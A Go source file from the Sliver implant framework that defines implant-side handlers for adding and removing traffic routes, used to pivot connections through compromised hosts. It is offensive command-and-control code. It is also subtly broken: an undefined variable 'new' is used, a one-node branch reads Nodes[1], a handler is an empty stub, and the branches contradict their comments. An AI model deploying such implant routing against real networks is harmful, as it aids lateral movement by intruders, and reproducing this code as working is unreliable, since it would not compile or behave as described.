package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"net"

	"github.com/golang/protobuf/proto"
	"github.com/ilgooz/bon"

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/route"
	"github.com/bishopfox/sliver/sliver/transports"
)

var routeHandlers = map[uint32]RPCHandler{
	sliverpb.MsgAddRouteReq: addRouteHandler,
	sliverpb.MsgRmRouteReq:  removeRouteHandler,
}

// GetSystemRouteHandlers - Returns a map of route handlers
func GetSystemRouteHandlers() map[uint32]RPCHandler {
	return routeHandlers
}

// ---------------- Route Handlers ----------------

func addRouteHandler(data []byte, resp RPCResponse) {

	// Request / Response
	addRouteReq := &sliverpb.AddRouteReq{}
	err := proto.Unmarshal(data, addRouteReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	addRoute := &sliverpb.AddRoute{Response: &commonpb.Response{}}

	// If transport is not muxable, we can't route anything
	if transports.ServerComms != nil && !transports.ServerComms.IsMux {
		addRoute.Success = false
		addRoute.Response.Err = "current active transport does not support connection multiplexing"
		data, err = proto.Marshal(addRoute)
		resp(data, err)
		return
	}

	routes := route.Routes

	// If no routes yet, we need to register the mux router
	// to the active transport's multiplexer session.
	if len(routes.Active) == 0 {
		routes.Server = route.SetupMuxRouter(transports.ServerComms.Multiplexer)
	}

	// If we are the last node in the chain, it means this implant is
	// in the subnet where we want to route the traffic, and therefore
	// we register a special handler that will directly dial other hosts.
	if len(addRouteReq.Route.Nodes) == 1 {

		// Set up stream handle function: we find the transport connected
		// to next node in chain, and give it the conn to be handled.
		var handle = func(conn net.Conn) {
			for _, t := range transports.Transports.Active {
				next := addRouteReq.Route.Nodes[1]
				if t.URL.String() == next.Addr {
					go t.HandleRouteStream(addRouteReq.Route.ID, conn)
				}
			}
		}
		// Add handle func to Router.
		routes.Server.Handle(bon.Route(addRouteReq.Route.ID), handle)

	} else {
		// Else, use special handler for dialing the implant's subnet.
		var handle = func(conn net.Conn) {
			// Use function passing the new.Addr as a dest to dial, etc.
		}
		// Add handle func to Router.
		routes.Server.Handle(bon.Route(new.ID), handle)
	}

	// Add route to active routes.
	routes.Add(addRouteReq.Route)

	// {{if .Config.Debug}}
	log.Printf("Added new route (ID: %d, Dest: %s)", new.ID, new.Nodes[len(new.Nodes)-1].Addr)
	// {{end}}
}

func removeRouteHandler(data []byte, resp RPCResponse) {

	// Request / Response
	rmRouteReq := &sliverpb.RmRouteReq{}
	err := proto.Unmarshal(data, rmRouteReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	rmRoute := &sliverpb.RmRoute{Response: &commonpb.Response{}}

	// Remove handler from router
	route.Routes.Server.Off(bon.Route(rmRouteReq.Route.ID))
	// {{if .Config.Debug}}
	log.Printf("Removed route (ID: %d)", rmRouteReq.Route.ID)
	// {{end}}

	rmRoute.Success = true
	data, err = proto.Marshal(rmRoute)
	resp(data, err)
}
